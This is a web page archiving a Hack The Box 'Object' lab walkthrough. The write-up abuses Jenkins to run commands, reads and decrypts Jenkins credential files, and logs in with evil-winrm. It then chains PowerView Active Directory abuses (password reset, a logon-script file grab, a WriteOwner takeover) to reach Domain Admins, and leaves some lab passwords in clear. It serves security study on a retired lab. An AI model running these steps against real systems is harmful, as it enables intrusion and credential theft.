1:"$Sreact.fragment"
2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
f:I[6025,[],"OutletBoundary"]
10:"$Sreact.suspense"
:HL["/writing/covers/hackthebox-object-walkthrough.webp","image"]
0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Object Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Object machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:30:13.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[14," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-object-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Object machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Object machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/object","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/e607a78d3b93f2606e10f52cbfcf44476475f625/HTB-Object.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · e607a78d3b93",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Object"," · Windows"," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/object","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7"]]}],"$L8"]}]]}],"$L9"]}],"$La","$Lb"],null,"$Lc"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"Ne0dOjg_j2qV4fkNvTxiJ"}
4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Object machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"9 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
d:T6f8c,
<p><strong>Difficulty:</strong> Hard | <strong>OS:</strong> Windows | <strong>IP:</strong> 10.129.96.147</p>
<hr />



<h2 id="1-mindset-and-methodology-a-name-mindset-a">1. Mindset &amp; Methodology <pre class="raw-markup-example"><code>&lt;a name="mindset"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<p>Before touching the target, understand the <strong>attacker's approach</strong>:</p>
<ul>
<li><strong>Every open port is a potential entry point.</strong> Web services, remote management, and unusual ports all deserve investigation.</li>
<li><strong>Enumerate before you exploit.</strong> Rushing to run exploits without understanding what's running wastes time and can break things.</li>
<li><strong>Follow the data.</strong> Configuration files, stored credentials, and service accounts tell you where to go next.</li>
<li><strong>In Active Directory, access is a chain.</strong> One account's permissions lead to another. BloodHound visualizes this chain so you can plan the entire escalation path before executing it.</li>
<li><strong>When you're blocked, pivot.</strong> Firewall blocking reverse shells? Find another way to get data out — write to files, use allowed protocols, read outputs from the tool itself.</li>
</ul>
<hr />
<h2 id="2-reconnaissance-nmap-a-name-recon-a">2. Reconnaissance — Nmap <pre class="raw-markup-example"><code>&lt;a name="recon"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did">What we did</h3>
<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.96.147 -Pn
nmap -p 80,5985,8080 -sCV 10.129.96.147
</code></pre>
<h3 id="what-we-found">What we found</h3>
<pre><code>80/tcp   open  http    Microsoft IIS httpd 10.0  (Mega Engines website)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0  (WinRM)
8080/tcp open  http    Jetty 9.4.43.v20210629  (Jenkins)
</code></pre>
<h3 id="why-we-do-this">Why we do this</h3>
<p>Nmap is always step one. We use <code>-p-</code> to scan <strong>all 65535 ports</strong> (not just the top 1000) because services are often hidden on non-standard ports. <code>--min-rate 10000</code> speeds it up. <code>-Pn</code> skips the host discovery ping (Windows often blocks ICMP which would cause Nmap to think the host is down).</p>
<p>The <code>-sCV</code> flag on the second scan runs <strong>service version detection</strong> (<code>-sV</code>) and <strong>default scripts</strong> (<code>-sC</code>) to fingerprint exactly what is running on each port.</p>
<h3 id="hacker-mindset">Hacker mindset</h3>
<ul>
<li>Port <strong>80</strong> = website, look for info leakage, domains, links</li>
<li>Port <strong>5985</strong> = WinRM (Windows Remote Management) — this is how we get a shell if we find credentials</li>
<li>Port <strong>8080</strong> = running Jetty (Java web server), not IIS — this suggests a separate application, likely Jenkins based on the robots.txt disallow</li>
</ul>
<hr />
<h2 id="3-web-enumeration-port-80-a-name-web80-a">3. Web Enumeration — Port 80 <pre class="raw-markup-example"><code>&lt;a name="web80"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-2">What we did</h3>
<pre><code class="language-bash" data-language="bash">echo "10.129.96.147 object.htb" | sudo tee -a /etc/hosts
</code></pre>
<p>Browse to <code>http://object.htb</code> — static marketing page for "Mega Engines". The page mentions an "automation server" and links to port 8080.</p>
<h3 id="why-we-do-this-2">Why we do this</h3>
<p>Always add discovered hostnames to <code>/etc/hosts</code>. Web applications often behave differently when accessed by hostname vs IP (virtual hosting). The link to port 8080 tells us what Jenkins is — the company's automation server.</p>
<h3 id="hacker-mindset-2">Hacker mindset</h3>
<p>The website itself has nothing exploitable (no login forms, no dynamic content). But it gives us the hostname and confirms Jenkins is intentionally exposed. That becomes our primary target.</p>
<hr />
<h2 id="4-jenkins-port-8080-a-name-jenkins-a">4. Jenkins — Port 8080 <pre class="raw-markup-example"><code>&lt;a name="jenkins"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-3">What we did</h3>
<p>Browse to <code>http://object.htb:8080</code> — redirects to Jenkins login. Jenkins version <strong>2.317</strong> shown in footer.</p>
<p><strong>Registered a new account</strong> (Jenkins allows self-registration by default).</p>
<h3 id="why-we-do-this-3">Why we do this</h3>
<p>Jenkins is a Continuous Integration / Continuous Deployment (CI/CD) automation server. Its entire purpose is to <strong>run code automatically</strong>. If we can create and trigger a Jenkins job, we get code execution on the server — which in this case is a Windows machine.</p>
<p>We register an account because:</p>
<ul>
<li>No default credentials work</li>
<li>No known unauthenticated exploits for this version</li>
<li>Jenkins allows user registration by default unless the admin locked it down</li>
</ul>
<h3 id="hacker-mindset-3">Hacker mindset</h3>
<p>Always check if a web application allows self-registration before trying to brute force or exploit. It saves time. Once inside, the question becomes: <em>what can a low-privilege authenticated user do?</em></p>
<hr />
<h2 id="5-command-execution-via-jenkins-job-a-name-rce-a">5. Command Execution via Jenkins Job <pre class="raw-markup-example"><code>&lt;a name="rce"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-4">What we did</h3>
<ol>
<li>Click <strong>New Item</strong> → name it <code>pwn</code> → <strong>Freestyle project</strong></li>
<li>Under <strong>Build Triggers</strong> → check <strong>Build periodically</strong> → enter <code>* * * * *</code> (every minute)</li>
<li>Under <strong>Build Steps</strong> → <strong>Add build step</strong> → <strong>Execute Windows batch command</strong></li>
<li>Enter command: <code>whoami</code></li>
<li>Save → wait 1 minute → check Console Output</li>
</ol>
<p><strong>Result:</strong></p>
<pre><code>C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\pwn&gt;whoami
object\oliver
</code></pre>
<h3 id="why-we-do-this-4">Why we do this</h3>
<p>A Jenkins "Freestyle project" is essentially a script runner. The <strong>Build periodically</strong> trigger uses cron syntax — <code>* * * * *</code> means run every minute. This gives us a reliable way to execute any Windows command on the server.</p>
<p>We start with <code>whoami</code> to confirm:</p>
<ol>
<li>We have execution</li>
<li>Which user the commands run as</li>
</ol>
<p>Running as <code>object\oliver</code> tells us Jenkins is running under the <code>oliver</code> Windows user account. This matters because it defines what files and directories we can access.</p>
<h3 id="why-not-a-reverse-shell">Why not a reverse shell?</h3>
<p>We'll discover in the next step that <strong>all outbound TCP is blocked by a firewall</strong>. So we can't connect back to our Kali. Instead, we use the Jenkins job output (the Console Output page) as our data channel — we run commands and read the output in the browser.</p>
<h3 id="hacker-mindset-4">Hacker mindset</h3>
<p>CI/CD tools are powerful because they're <strong>designed to run commands</strong>. That's not a vulnerability — it's the feature we're abusing. The attacker's goal here is simple: find a way to read output from commands we control.</p>
<hr />
<h2 id="6-firewall-discovery-a-name-firewall-a">6. Firewall Discovery <pre class="raw-markup-example"><code>&lt;a name="firewall"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-5">What we did</h3>
<p>Changed the batch command to:</p>
<pre><code class="language-powershell" data-language="powershell">powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},Enabled,Action"
</code></pre>
<p><strong>Result:</strong> A rule called <code>BlockOutboundDC</code> blocks <strong>all outbound TCP</strong>.</p>
<h3 id="why-we-do-this-5">Why we do this</h3>
<p>Before spending time crafting reverse shells that won't work, we check the firewall rules. This is a critical enumeration step on Windows — Windows Firewall rules are readable by normal users and tell you exactly what traffic is allowed.</p>
<h3 id="hacker-mindset-5">Hacker mindset</h3>
<p>When your reverse shell doesn't connect back, don't keep trying variations blindly. Diagnose the problem first. Check firewall rules, proxy settings, and network restrictions. Here, ICMP (ping) still worked outbound — which confirms the box is alive but TCP is blocked.</p>
<p>The implication: <strong>we cannot get an interactive reverse shell</strong>. We must do all our work through the Jenkins console output mechanism.</p>
<hr />
<h2 id="7-stealing-jenkins-credentials-a-name-creds-a">7. Stealing Jenkins Credentials <pre class="raw-markup-example"><code>&lt;a name="creds"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-6">What we did</h3>
<p><strong>Step 1 — Find the admin user folder:</strong></p>
<pre><code>powershell -c "ls ..\..\users"
</code></pre>
<p>Result: <code>admin_17207690984073220035</code></p>
<p><strong>Step 2 — Read the admin's config.xml:</strong></p>
<pre><code>type ..\..\users\admin_17207690984073220035\config.xml
</code></pre>
<p>Found encrypted password for user <code>oliver</code>:</p>
<pre><code>{[redacted encoded lab material]}
</code></pre>
<p><strong>Step 3 — Read master.key:</strong></p>
<pre><code>type ..\..\secrets\master.key
</code></pre>
<p>Result: <code>f673fdb0c4fcc339...</code></p>
<p><strong>Step 4 — Read hudson.util.Secret (binary file, so base64 encode it):</strong></p>
<pre><code>powershell -c "[convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte))"
</code></pre>
<p>Result: <code>gWFQFlTxi+xRdwcz6KgADwG+...</code></p>
<h3 id="why-we-do-this-6">Why we do this</h3>
<p>Jenkins stores credentials (used in pipelines and jobs) encrypted in XML files on disk. The encryption is not unbreakable — it uses a known algorithm (AES) with keys stored in predictable locations:</p>
<table>
<thead>
<tr>
<th>File</th>
<th>Purpose</th>
</tr>
</thead>
<tbody><tr>
<td><code>users/admin_*/config.xml</code></td>
<td>Contains the encrypted credential</td>
</tr>
<tr>
<td><code>secrets/master.key</code></td>
<td>Key used to decrypt <code>hudson.util.Secret</code></td>
</tr>
<tr>
<td><code>secrets/hudson.util.Secret</code></td>
<td>Key used to decrypt stored passwords</td>
</tr>
</tbody></table>
<p>Because Jenkins runs as <code>oliver</code> and these files are in oliver's home directory, we can read them all.</p>
<p>We base64 encode <code>hudson.util.Secret</code> because it's a <strong>binary file</strong> — printing it directly would garble the output. Base64 encoding makes it safe to copy/paste as text.</p>
<h3 id="hacker-mindset-6">Hacker mindset</h3>
<p>Always look for <strong>stored credentials</strong> when you have file system access. CI/CD systems like Jenkins need to store credentials to connect to other systems (source control, deployment targets). Those stored credentials are gold — they often reuse passwords across services.</p>
<p>The path <code>..\..\</code> from the workspace navigates up to the <code>.jenkins</code> root directory. Knowing the Jenkins directory structure (publicly documented) lets you go straight to the valuable files.</p>
<hr />
<h2 id="8-decrypting-the-password-a-name-decrypt-a">8. Decrypting the Password <pre class="raw-markup-example"><code>&lt;a name="decrypt"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-7">What we did</h3>
<p>On Kali:</p>
<pre><code class="language-bash" data-language="bash"># Save master.key
echo -n "f673fdb0c4fcc339..." &gt; master.key

# Decode hudson.util.Secret from base64 to binary
echo "gWFQFlTxi+xRdwcz..." | base64 -d &gt; hudson.util.Secret

# Create a credentials XML with the encrypted password
cat &gt; config.xml &lt;&lt; 'EOF'
&lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
  &lt;username&gt;oliver&lt;/username&gt;
  &lt;password&gt;{[redacted encoded lab material]}&lt;/password&gt;
&lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
EOF

# Download the decryption script
wget https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py

# Install dependency and run
pip install pycryptodome
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml
</code></pre>
<p><strong>Result:</strong> <code>c1cdfun_d2434</code></p>
<h3 id="why-we-do-this-7">Why we do this</h3>
<p>Jenkins uses AES encryption. The <code>pwn_jenkins</code> script implements the exact same decryption algorithm Jenkins uses internally. Given the three files (master.key, hudson.util.Secret, credentials XML), it can reverse the encryption completely — no brute force needed.</p>
<h3 id="hacker-mindset-7">Hacker mindset</h3>
<p>Encryption is only as strong as the key management. Jenkins stores everything needed to decrypt on the same disk. This is a design trade-off (usability vs security), but for a pentester it means: <strong>if you can read the files, you can decrypt the secrets</strong>.</p>
<hr />
<h2 id="9-winrm-foothold-oliver-a-name-winrm-oliver-a">9. WinRM Foothold — oliver <pre class="raw-markup-example"><code>&lt;a name="winrm-oliver"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-8">What we did</h3>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.96.147 -u oliver -p REDACTED
</code></pre>
<pre><code class="language-powershell" data-language="powershell">type C:\Users\oliver\Desktop\user.txt
# b814a[redacted]1c7f9f72046
</code></pre>
<h3 id="why-we-do-this-8">Why we do this</h3>
<p>WinRM (port 5985) is Windows' remote management protocol — like SSH for Windows. <code>evil-winrm</code> is a Ruby tool that wraps WinRM into an interactive shell with extra features (file upload/download, PowerShell modules).</p>
<p>We try the decrypted Jenkins credential directly on WinRM because <strong>password reuse is extremely common</strong>. The admin stored oliver's Windows password in Jenkins — and oliver used the same password for his Windows account.</p>
<h3 id="hacker-mindset-8">Hacker mindset</h3>
<p>Always try discovered credentials against every available service. One credential finding can open multiple doors. Here, the Jenkins credential = REDACTED Windows account credential = REDACTED access.</p>
<hr />
<h2 id="10-active-directory-enumeration-bloodhound-a-name-bloodhound-a">10. Active Directory Enumeration — BloodHound <pre class="raw-markup-example"><code>&lt;a name="bloodhound"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-9">What we did</h3>
<p>The machine already had SharpHound.exe and a completed zip in oliver's Documents folder. Downloaded the zip and imported into BloodHound.</p>
<pre><code class="language-powershell" data-language="powershell">download C:\Users\oliver\Documents\20260609084858_BloodHound.zip
</code></pre>
<p>On Kali:</p>
<pre><code class="language-bash" data-language="bash">sudo neo4j start
bloodhound &amp;
# Import zip, mark oliver as Owned
# Analysis → Find Shortest Paths to Domain Admins
</code></pre>
<p><strong>Result:</strong> <code>oliver → ForceChangePassword → smith → GenericWrite → maria → WriteOwner → Domain Admins</code></p>
<h3 id="why-we-do-this-9">Why we do this</h3>
<p>In Active Directory, <strong>permissions are everything</strong>. A user might not have admin rights directly, but might have permissions <em>over other objects</em> that eventually lead to admin. Manually checking every object's ACL is impractical — BloodHound automates this by:</p>
<ol>
<li><strong>SharpHound</strong> — runs on the target, collects all AD objects, group memberships, and ACLs</li>
<li><strong>BloodHound</strong> — loads the data into a graph database and finds attack paths using graph theory</li>
</ol>
<p>The "Shortest Path to Domain Admins" query finds the minimum number of hops from your owned user to DA.</p>
<h3 id="what-each-edge-means">What each edge means</h3>
<table>
<thead>
<tr>
<th>Edge</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td><code>ForceChangePassword</code></td>
<td>Can reset another user's password without knowing the current one</td>
</tr>
<tr>
<td><code>GenericWrite</code></td>
<td>Can write to any non-protected attribute of an AD object</td>
</tr>
<tr>
<td><code>WriteOwner</code></td>
<td>Can take ownership of an AD object (then grant yourself any rights)</td>
</tr>
</tbody></table>
<h3 id="hacker-mindset-9">Hacker mindset</h3>
<p>In AD environments, <strong>don't think about what you have — think about what you can reach</strong>. A chain of three low-severity permissions combines into full domain compromise. BloodHound makes these invisible relationships visible.</p>
<hr />
<h2 id="11-ad-abuse-1-forcechangepassword-oliver-smith-a-name-smith-a">11. AD Abuse 1: ForceChangePassword — oliver → smith <pre class="raw-markup-example"><code>&lt;a name="smith"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-10">What we did</h3>
<p>In Evil-WinRM as oliver, uploaded PowerView.ps1 then:</p>
<pre><code class="language-powershell" data-language="powershell">Import-Module .\PowerView.ps1
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity smith -AccountPassword $newpass
</code></pre>
<p>Then connected as smith:</p>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.96.147 -u smith -p REDACTED
</code></pre>
<h3 id="why-we-do-this-10">Why we do this</h3>
<p><code>ForceChangePassword</code> is an AD permission that lets you set a user's password to anything — without knowing their current password. PowerView's <code>Set-DomainUserPassword</code> automates this.</p>
<p>We need to be smith because smith has the next permission in the chain (<code>GenericWrite</code> over maria). We can't abuse that permission as oliver.</p>
<h3 id="why-powerview">Why PowerView?</h3>
<p>PowerView is a PowerShell library for AD enumeration and manipulation. It wraps complex LDAP/AD calls into simple functions. It's part of PowerSploit and is the standard tool for AD abuse in engagements.</p>
<h3 id="hacker-mindset-10">Hacker mindset</h3>
<p><code>ForceChangePassword</code> is a legitimate AD delegation feature (help desk workers can reset passwords). But when it's misconfigured on a regular user account rather than a help desk group, it becomes an attack vector. Always check what you can <strong>do to other objects</strong>, not just what you can do directly.</p>
<hr />
<h2 id="12-ad-abuse-2-genericwrite-smith-maria-a-name-maria-a">12. AD Abuse 2: GenericWrite — smith → maria <pre class="raw-markup-example"><code>&lt;a name="maria"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-11">What we did</h3>
<p>As smith with PowerView:</p>
<pre><code class="language-powershell" data-language="powershell"># Write a script to copy maria's files
Set-Content -Path C:\programdata\check.ps1 -Value 'Copy-Item C:\Users\maria\Desktop\Engines.xls C:\programdata\Engines.xls'

# Set that script as maria's logon script via GenericWrite
Set-DomainObject -Identity maria -SET @{scriptpath='C:\programdata\check.ps1'}
</code></pre>
<p>Wait ~5-10 seconds → the file appears at <code>C:\programdata\Engines.xls</code></p>
<pre><code class="language-powershell" data-language="powershell">download C:\programdata\Engines.xls
</code></pre>
<h3 id="why-genericwrite-allows-this">Why GenericWrite allows this</h3>
<p><code>GenericWrite</code> lets you write to any <strong>non-protected</strong> attribute of an AD user object. The <code>scriptpath</code> attribute defines a logon script — a script that runs every time the user logs in (or in this case, every time an automated task simulates a login).</p>
<p>The box has a scheduled task running as maria that continuously executes whatever is set as her logon script. This is confirmed because the file appears within seconds of setting the scriptpath.</p>
<h3 id="why-we-target-engines-xls">Why we target Engines.xls</h3>
<p>After listing maria's Desktop directory (by setting the script to <code>dir C:\Users\maria\Desktop &gt; C:\programdata\out.txt</code>), we found <code>Engines.xls</code> — an Excel file that likely contains credentials based on its name and context.</p>
<h3 id="hacker-mindset-11">Hacker mindset</h3>
<p><code>GenericWrite</code> has many potential abuses. The logon script method is ideal here because:</p>
<ol>
<li>We can't get a reverse shell (firewall)</li>
<li>The automation runs repeatedly — we get results within seconds</li>
<li>We can chain multiple scripts to exfiltrate any file we want</li>
</ol>
<p>Think of it as using maria's account as a <strong>file copy robot</strong> that we control via her AD attributes.</p>
<hr />
<h2 id="13-finding-maria-s-password-engines-xls-a-name-engines-a">13. Finding maria's Password — Engines.xls <pre class="raw-markup-example"><code>&lt;a name="engines"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-found-2">What we found</h3>
<pre><code>Name                      | Chamber Username | Chamber Password
Internal Combustion Engine | maria            | d34gb8@
Stirling Engine            | maria            | 0de_434_d545
Diesel Engine              | maria            | W3llcr4ft3d_4cls
</code></pre>
<h3 id="testing-passwords">Testing passwords</h3>
<pre><code class="language-bash" data-language="bash">netexec winrm 10.129.96.147 -u maria -p REDACTED
</code></pre>
<p><strong>Result:</strong> <code>W3llcr4ft3d_4cls</code> — <code>(Pwn3d!)</code></p>
<h3 id="why-we-do-this-11">Why we do this</h3>
<p>The Excel file is an inventory spreadsheet with passwords stored in plaintext. This is a common finding in real engagements — employees store credentials in Excel/Word documents on their desktops.</p>
<p>We test all three passwords against WinRM because we don't know which one is maria's current Windows password. <code>netexec</code> (formerly crackmapexec) makes spray testing fast.</p>
<h3 id="hacker-mindset-12">Hacker mindset</h3>
<p><strong>People are the weakest link.</strong> A user keeping a password spreadsheet on their desktop defeats all the technical security controls. Finding and testing all discovered credentials is essential — even if they look like credentials for other systems, they might be reused.</p>
<hr />
<h2 id="14-winrm-as-maria-a-name-winrm-maria-a">14. WinRM as maria <pre class="raw-markup-example"><code>&lt;a name="winrm-maria"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-12">What we did</h3>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.96.147 -u maria -p REDACTED
</code></pre>
<h3 id="why">Why</h3>
<p>We now have access as maria, who has <code>WriteOwner</code> over Domain Admins — the final step to full compromise.</p>
<hr />
<h2 id="15-ad-abuse-3-writeowner-maria-domain-admins-a-name-da-a">15. AD Abuse 3: WriteOwner — maria → Domain Admins <pre class="raw-markup-example"><code>&lt;a name="da"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<h3 id="what-we-did-13">What we did</h3>
<p>As maria, imported PowerView then:</p>
<pre><code class="language-powershell" data-language="powershell"># Step 1: Take ownership of the Domain Admins group
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria

# Step 2: As owner, grant maria full rights over the group
Add-DomainObjectAcl -PrincipalIdentity maria -TargetIdentity "Domain Admins" -Rights All

# Step 3: Add maria to Domain Admins
net group "Domain Admins" maria /add /domain
</code></pre>
<p>Then <strong>exited and reconnected</strong> to refresh the session token:</p>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.96.147 -u maria -p REDACTED
</code></pre>
<h3 id="why-three-steps">Why three steps?</h3>
<p>This is how Windows permission delegation works:</p>
<ol>
<li><strong>WriteOwner</strong> only lets you <em>change who owns the object</em> — it doesn't give you any other rights yet</li>
<li><strong>Once you're the owner</strong>, Windows lets owners modify the object's DACL (security descriptor) regardless of existing ACEs — so we grant ourselves <code>All</code> rights</li>
<li><strong>With All rights</strong>, we can finally add members to the group</li>
</ol>
<h3 id="why-reconnect">Why reconnect?</h3>
<p>Windows access tokens (your "session credentials") are generated at login time and include group memberships at that moment. Adding yourself to a group mid-session doesn't update your current token. You must <strong>start a new session</strong> to get a token that includes the new group membership.</p>
<h3 id="hacker-mindset-13">Hacker mindset</h3>
<p><code>WriteOwner</code> is an often-overlooked permission. Many defenders focus on <code>WriteDACL</code> or <code>GenericAll</code>, but ownership is even more powerful — it bypasses the DACL entirely. The three-step process mirrors what an admin would do legitimately when managing group ownership.</p>
<hr />
<h2 id="16-root-flag-a-name-root-a">16. Root Flag <pre class="raw-markup-example"><code>&lt;a name="root"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<pre><code class="language-powershell" data-language="powershell">type C:\Users\Administrator\Desktop\root.txt
# 454a877[redacted]393c4c
</code></pre>
<hr />
<h2 id="17-summary-the-full-attack-chain-a-name-summary-a">17. Summary — The Full Attack Chain <pre class="raw-markup-example"><code>&lt;a name="summary"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
<pre><code>[Attacker: 10.10.16.84]
        |
        | HTTP port 8080
        v
[Jenkins 2.317]
  - Register account
  - Create Freestyle job
  - Schedule every minute
  - Execute Windows batch commands
  - Read Jenkins credential files via job output
        |
        | Decrypt encrypted password
        | oliver:c1cdfun_d2434
        v
[WinRM — oliver]  →  user.txt
  - Upload SharpHound
  - Collect BloodHound data
  - Upload PowerView
        |
        | ForceChangePassword
        v
[WinRM — smith]
  - Upload PowerView
  - GenericWrite on maria
  - Set logon script → copy Engines.xls
        |
        | Engines.xls contains passwords
        | maria:W3llcr4ft3d_4cls
        v
[WinRM — maria]
  - Upload PowerView
  - WriteOwner on Domain Admins
  - Take ownership → grant self All rights
  - Add maria to Domain Admins
  - Reconnect for new token
        |
        v
[Domain Admin]  →  root.txt
</code></pre>
<h3 id="key-lessons">Key Lessons</h3>
<table>
<thead>
<tr>
<th>Lesson</th>
<th>Application</th>
</tr>
</thead>
<tbody><tr>
<td>Jenkins stores decryptable credentials</td>
<td>Always enumerate CI/CD tool config files</td>
</tr>
<tr>
<td>Firewall blocks reverse shells</td>
<td>Use the tool's own output mechanism as your data channel</td>
</tr>
<tr>
<td>Password reuse</td>
<td>Try every found credential against every available service</td>
</tr>
<tr>
<td>AD permissions chain</td>
<td>One weak ACE leads to the next — map the full path with BloodHound</td>
</tr>
<tr>
<td>Logon scripts = code execution as another user</td>
<td>GenericWrite on users is extremely powerful</td>
</tr>
<tr>
<td>Object ownership bypasses ACLs</td>
<td>WriteOwner is as dangerous as WriteDACL</td>
</tr>
<tr>
